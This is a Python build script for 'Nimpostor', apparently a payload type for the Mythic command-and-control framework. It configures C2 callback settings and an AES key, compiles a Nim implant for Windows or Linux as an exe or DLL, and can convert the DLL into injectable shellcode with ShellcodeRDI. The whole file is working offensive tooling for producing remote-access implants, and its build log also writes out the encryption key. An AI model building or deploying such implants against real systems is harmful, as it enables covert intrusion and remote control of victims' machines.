from mythic_payloadtype_container.PayloadBuilder import *
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import sys
import json
import asyncio
import os
from distutils.dir_util import copy_tree
import tempfile
import zipfile
sys.path.insert(1, '/opt')
import ShellcodeRDI

#define your payload type class here, it must extend the PayloadType class though
class Nimpostor(PayloadType):

    name = "nimpostor"  # name that would show up in the UI
    file_extension = "zip"  # default file extension to use when creating payloads
    author = "@Sobol"  # author of the payload type
    mythic_encrypts = True
    supported_os = [  # supported OS and architecture combos
        SupportedOS.Windows, SupportedOS.Linux # update this list with all the OSes your agent supports
    ]
    wrapper = False  # does this payload type act as a wrapper for another payloads inside of it?
    # if the payload supports any wrapper payloads, list those here
    wrapped_payloads = [] # ex: "service_wrapper"
    note = "A little agent written in Nim to infiltrate everything"
    supports_dynamic_loading = True  # setting this to True allows users to only select a subset of commands when generating a payload
    build_parameters = [
        #  these are all the build parameters that will be presented to the user when creating your payload
        BuildParameter(
            name="os",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose target OS",
            choices=["windows", "linux"],
            default_value="windows",
            ),
        BuildParameter(
            name="lang",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose the language the implant will be compiled in",
            choices=["C", "C++"],
            ),
        BuildParameter(
            name="build",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose if implant is built in debug mode or release mode. If in debug mode, source will be embedded in the comments and more output is shown",
            default_value="release",
            choices=["release", "debug"],
            ),
        BuildParameter(
            name="arch",
            parameter_type=BuildParameterType.ChooseOne,
            description="Target architecture",
            choices=["x64", "x86"],
            default_value="x64",
            ),
        BuildParameter(
            name="format",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose format for output",
            choices=["exe", "dll", "bin"],
            ),
        BuildParameter(
            name="chunk_size",
            parameter_type=BuildParameterType.String,
            default_value="512000",
            description="Provide a chunk size for large files",
            required=False,
            ),
        BuildParameter(
            name="default_proxy",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            required=False,
            description="Use the default proxy on the system",
            ),
    ]
    #  the names of the c2 profiles that your agent supports
    c2_profiles = ["http"]
    support_browser_scripts = [
            BrowserScript(script_name="copy_additional_info_to_clipboard", author="@djhohnstein"),
            BrowserScript(script_name="create_table", author="@djhohnstein"),
            BrowserScript(script_name="create_table_with_name", author="@djhohnstein"),
            BrowserScript(script_name="collapsable", author="@djhohnstein"),
            BrowserScript(script_name="create_process_additional_info_modal", author="@djhohnstein"),
            BrowserScript(script_name="file_size_to_human_readable_string", author="@djhohnstein"),
            BrowserScript(script_name="integrity_level_to_string", author="@djhohnstein"),
            BrowserScript(script_name="show_process_additional_info_modal", author="@djhohnstein"),
            BrowserScript(script_name="show_permission_additional_info_modal", author="@djhohnstein"),
    ]
    #translation_container = None
    # after your class has been instantiated by the mythic_service in this docker container and all required build parameters have values
    # then this function is called to actually build the payload
    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)
        output = ""
        special_files_map = {
                "config.nim": {
                    "CallBackHosts": "",
                    "PayloadUUID": self.uuid,
                    "UserAgent": "",
                    "HostHeader": "",
                    "Param": "",
                    "ChunkSize": "",
                    "DefaultProxy": "",
                    "ProxyAddress": "",
                    "ProxyUser": "",
                    "ProxyPassword": "",
                    "Sleep": "",
                    "Jitter": "",
                    "KillDate": "",
                    "GetUrl": "",
                    "PostUrl": "",
                    "Psk": "",
                },
        }

        try:
            # make a temp directory for it to live
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            # shutil to copy payload files over
            copy_tree(self.agent_code_path, agent_build_path.name)
            # first replace everything in the c2 profiles
            file1 = open("{}/utils/config.nim".format(agent_build_path.name), 'r').read()
            file1 = file1.replace('payload_uuid', self.uuid)
            #file1 = file1.replace('%CHUNK_SIZE%', self.get_parameter('chunk_size'))
            #file1 = file1.replace('%DEFAULT_PROXY%', "{}".format(self.get_parameter('default_proxy')))
            profile = None
            is_https = False
            aespsk_val = ""
            c2 = self.c2info[0]
            profile = c2.get_c2profile()['name']
            if profile not in self.c2_profiles:
                resp.build_message = "Invalid c2 profile name specified"
                return resp
            for key, val in c2.get_parameters_dict().items():
                if isinstance(val, dict):
                    if c2.get_parameters_dict()["AESPSK"]["enc_key"] != None:
                        aespsk_val = c2.get_parameters_dict()["AESPSK"]["enc_key"]
                elif not isinstance(val, str):
                    file1 = file1.replace(key, json.dumps(val))
                else:
                    file1 = file1.replace(key, val)
            with open("{}/utils/config.nim".format(agent_build_path.name), 'w') as f:
                f.write(file1)

            out_ext = '.dll' if self.get_parameter('format') == 'bin' else '.dll' \
                      if self.get_parameter('format') == 'dll' else '.exe'

            # TODO research --passL:-W --passL:ldl
            resp.build_message += f'format: {self.get_parameter("format")}\n'
            resp.build_message += f'aespsk_val: {aespsk_val}\n'
            command = f"nim --threads:on --gc:arc --tlsEmulation:on {'c' if self.get_parameter('lang') == 'C' else 'cpp'} {'--os:linux --passL:-W --passL:-ldl' if self.get_parameter('os') == 'linux' else ''} -f -d:mingw {'-d:debug --hints:on --nimcache:' + agent_build_path.name if self.get_parameter('build') == 'debug' else '-d:release --hints:off'} {'-d:AESPSK=' + aespsk_val if len(aespsk_val) > 2 else ''} --opt:size --passC:-flto --passL:-flto --passL:-s {'--app:lib' if self.get_parameter('format') == 'dll' or self.get_parameter('format') == 'bin' else ''} {'--nomain' if self.get_parameter('format') == 'dll' or self.get_parameter('format') == 'bin' else ''} {'--embedsrc:on' if self.get_parameter('build') == 'debug' else ''} --cpu:{'amd64' if self.get_parameter('arch') == 'x64' else 'i386'} --out:{self.name}{out_ext} c2/base.nim"
            resp.build_message += f'command: {command}\n attempting to compile...\n'
            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
            stdout, stderr = await proc.communicate()
            if stdout:
                resp.build_message += f'[stdout]\n{stdout.decode()}\n'
            if stderr:
                resp.build_message += f'[stderr]\n{stderr.decode()}\n'
            resp.build_message += f'appending output: {output}\n'
            resp.build_message += 'Attempting to zip output\n'

            if self.get_parameter('format') != "bin":
                zipfile.ZipFile(f'{agent_build_path.name}/{self.name}.zip', 'w').write(f'{agent_build_path.name}/{self.name}{out_ext}')
            else:
                resp.build_message += f'Its shellcode so we sRDI it: {agent_build_path.name}/{self.name}\n'
                shellcode_path = "{}/loader.bin".format(agent_build_path.name)
                resp.build_message += f'This is our shellcode path: {shellcode_path}\n'
                #converterPath = "/Mythic/agent_code/ConvertToShellcode.py"
                #command = "chmod 777 {}; chmod +x {}".format(converterPath, converterPath)
                #proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                #stdout, stderr = await proc.communicate()
                #if stdout:
                #    output += f'[stdout]\n{stdout.decode()}\n'
                #if stderr:
                #    output += f'[stderr]\n{stderr.decode()}\n'

                #command = f'python3 {converterPath} -f Run -c -i -d 7 {agent_build_path.name}/{self.name}'
                #proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
                #stdout, stderr = await proc.communicate()
                #if stdout:
                #    output += f'[stdout]\n{stdout.decode()}\n'
                #if stderr:
                #    output += f'[stderr]\n{stderr.decode()}\n'
                #resp.build_message += f'appending output: {output}\n'

                dll = open(f'{agent_build_path.name}/{self.name}{out_ext}', 'rb').read()
                shellcode = ShellcodeRDI.ConvertToShellcode(dll, ShellcodeRDI.HashFunctionName('Run'), flags=0x5)
                with open(shellcode_path, 'wb') as f:
                    f.write(shellcode)
                if (not os.path.exists(shellcode_path)):
                    resp.build_message += "Failed to create shellcode"
                    resp.status = BuildStatus.Error
                    resp.payload = b""
                else:
                    zipfile.ZipFile(f'{agent_build_path.name}/{self.name}.zip', 'w').write(f'{shellcode_path}')

            resp.payload = open(f'{agent_build_path.name}/{self.name}.zip', 'rb').read()
            resp.build_message += 'Successfully built and zipped\n'
            resp.status = BuildStatus.Success
        except Exception as e:
            import traceback, sys
            exc_type, exc_value, exc_traceback = sys.exc_info()
            resp.build_message += f"Error building payload: {e} traceback: " + repr(traceback.format_exception(exc_type, exc_value, exc_traceback))
        return resp
